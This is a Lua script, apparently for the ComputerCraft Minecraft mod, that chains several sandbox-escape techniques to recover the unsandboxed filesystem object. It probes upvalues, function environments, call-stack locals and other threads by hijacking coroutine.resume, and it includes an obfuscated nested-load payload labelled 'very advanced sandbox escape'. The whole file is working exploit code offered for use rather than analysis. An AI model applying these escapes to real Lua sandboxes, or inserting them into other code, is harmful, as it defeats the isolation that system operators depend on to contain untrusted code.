-- thanks to valued user 6_4 for the suggestion

local function different_to_global(candidate_fs)
    local seen = {}
    for _, i in pairs(fs.list "") do
        seen[i] = true
    end
    for _, i in pairs(candidate_fs.list "") do
        if not seen[i] then return true end
    end
    return false
end

local function is_probably_filesystem(x)
    if type(x) ~= "table" then return false end
    local keys = {
        "open", "exists", "delete", "makeDir", "list", "combine", "getSize", "isDir", "move", "find", "getFreeSpace", "getDrive"
    }
    for _, k in pairs(keys) do
        if type(x[k]) ~= "function" then return false end
    end
    return different_to_global(x)
end

local function harvest_upvalues(fn)
    local i = 1
    while true do
        local ok, name, value = pcall(debug.getupvalue, fn, i)
        if not ok then return end
        if name == nil then break end
        if is_probably_filesystem(value) then
            return value
        elseif type(value) == "table" and value.fs and is_probably_filesystem(value.fs) then
            return value.fs
        end
        i = i + 1
    end
end

local dgetfenv = (getfenv or (debug and debug.getfenv))
local function scan_environment(fn)
    local k = dgetfenv(fn).fs
    if is_probably_filesystem(k) then return k end
end

local function scan_stack(thread)
    local level = 1
    while debug.getinfo(thread, level) do
        local index = 1
        repeat
            local name, value = debug.getlocal(thread, level, index)
            if is_probably_filesystem(value) then return value end
            if type(value) == "function" then
                local ok, value = pcall(harvest_upvalues, value)
                if ok and value then return value end
                ok, value = pcall(scan_environment, value)
                if ok and value then return value end
            end
            index = index + 1
        until not name
        level = level + 1
    end
end

local escapes = {
    load_env = function()
        local k = dgetfenv(load("")).fs
        if is_probably_filesystem(k) then return k end
    end,
    equals = function()
        -- very advanced sandbox escape
        local k=load[=================[
        local _=({load[=======[local _;
        return pcall(load[=[return load
        ]=][=[=]=],function()_=load[==[
        return debug.getinfo(#[=[===]=]
        ).func[=[return fs]=][=[]=]]==]
        [=[]=]end),_]=======][=[==]=]})
        [#[=======[==]=======]]return _
        ]=================][===[==]===]
        if is_probably_filesystem(k) then return k end
    end,
    getfenv = function()
        for _, v in pairs(fs) do
            local res = scan_environment(v)
            if res then return res end
        end
        for _, v in pairs(os) do
            local res = scan_environment(v)
            if res then return res end
        end
    end,
    upvalue = function()
        for _, v in pairs(fs) do
            local res = harvest_upvalues(v)
            if res then return res end
        end
        for _, v in pairs(os) do
            local res = harvest_upvalues(v)
            if res then return res end
        end
    end,
    getfenv_stack_level = function()
        local i = 1
        while true do
            local res = getfenv(i).fs
            if is_probably_filesystem(res) then
                return res
            end
            i = i + 1
        end
    end,
    scan_most_threads = function()  
        if not debug then return end
        if not (debug.getinfo and debug.getlocal) then return end
        local running = coroutine.running()
        local threads_to_scan = {}
        local old_resume = coroutine.resume
        coroutine.resume = function(...)
            threads_to_scan[coroutine.running()] = true
            threads_to_scan[...] = true
            if ... == running then
                coroutine.resume = old_resume
            end
            return old_resume(...)
        end
        sleep(0)
        for thread, _ in pairs(threads_to_scan) do
            if type(thread) == "thread" then
                local ok, value = pcall(scan_stack, thread)
                if ok and value then return value end
            end
        end
    end
}

return function()
    for name, escape in pairs(escapes) do
        local ok, err = pcall(escape)
        print(name, ok, err)
        if ok and err then
            return err
        end
    end
end